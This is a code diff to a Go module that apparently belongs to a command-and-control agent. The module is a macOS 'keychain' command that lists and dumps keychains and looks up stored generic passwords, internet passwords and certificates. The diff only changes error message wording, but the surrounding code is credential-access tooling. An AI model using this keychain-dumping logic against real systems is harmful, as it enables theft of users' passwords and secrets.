@@ -42,7 +42,7 @@ type keychainArgs struct {
 
 func (c *KeychainCommand) Execute(task structs.Task) structs.CommandResult {
 	if task.Params == "" {
-		return errorResult("Error: parameters required. Actions: list, dump, find-password, find-internet, find-cert")
+		return errorResult("parameters required. Actions: list, dump, find-password, find-internet, find-cert")
 	}
 
 	args, parseErr := unmarshalParams[keychainArgs](task)
@@ -70,7 +70,7 @@ func (c *KeychainCommand) Execute(task structs.Task) structs.CommandResult {
 func keychainList() structs.CommandResult {
 	out, err := keychainExec("list-keychains")
 	if err != nil {
-		return errorf("Error listing keychains: %v\n%s", err, string(out))
+		return errorf("listing keychains: %v\n%s", err, string(out))
 	}
 
 	// Also get default and login keychain info
@@ -93,7 +93,7 @@ func keychainList() structs.CommandResult {
 func keychainDump() structs.CommandResult {
 	out, err := keychainExec("dump-keychain")
 	if err != nil {
-		return errorf("Error dumping keychain: %v\n%s", err, string(out))
+		return errorf("dumping keychain: %v\n%s", err, string(out))
 	}
 
 	output := string(out)
@@ -108,7 +108,7 @@ func keychainDump() structs.CommandResult {
 func keychainFindGeneric(args keychainArgs) structs.CommandResult {
 	// If no filters specified, inform user
 	if args.Service == "" && args.Account == "" && args.Label == "" {
-		return errorResult("Error: specify at least one filter: service, account, or label\nExample: keychain -action find-password -service \"Wi-Fi\"")
+		return errorResult("specify at least one filter: service, account, or label\nExample: keychain -action find-password -service \"Wi-Fi\"")
 	}
 
 	filterArgs := macBuildFilterArgs(args.Service, args.Account, args.Label)
@@ -129,7 +129,7 @@ func keychainFindGeneric(args keychainArgs) structs.CommandResult {
 			if macIsItemNotFound(output2) {
 				return successResult("No matching generic password found")
 			}
-			return errorf("Error: %v\n%s", err2, output2)
+			return errorf("%v\n%s", err2, output2)
 		}
 		return successResult(string(out2) + "\n[NOTE: Password data unavailable — authorization required or keychain locked]")
 	}
@@ -141,7 +141,7 @@ func keychainFindGeneric(args keychainArgs) structs.CommandResult {
 func keychainFindInternet(args keychainArgs) structs.CommandResult {
 	// If no filters specified, inform user
 	if args.Server == "" && args.Account == "" && args.Label == "" {
-		return errorResult("Error: specify at least one filter: server, account, or label\nExample: keychain -action find-internet -server \"github.com\"")
+		return errorResult("specify at least one filter: server, account, or label\nExample: keychain -action find-internet -server \"github.com\"")
 	}
 
 	// For internet passwords, -s is server (not service)
@@ -163,7 +163,7 @@ func keychainFindInternet(args keychainArgs) structs.CommandResult {
 			if macIsItemNotFound(output2) {
 				return successResult("No matching internet password found")
 			}
-			return errorf("Error: %v\n%s", err2, output2)
+			return errorf("%v\n%s", err2, output2)
 		}
 		return successResult(string(out2) + "\n[NOTE: Password data unavailable — authorization required or keychain locked]")
 	}
@@ -181,7 +181,7 @@ func keychainFindCert(args keychainArgs) structs.CommandResult {
 
 	out, err := keychainExec(cmdArgs...)
 	if err != nil {
-		return errorf("Error finding certificates: %v\n%s", err, string(out))
+		return errorf("finding certificates: %v\n%s", err, string(out))
 	}
 
 	output := string(out)
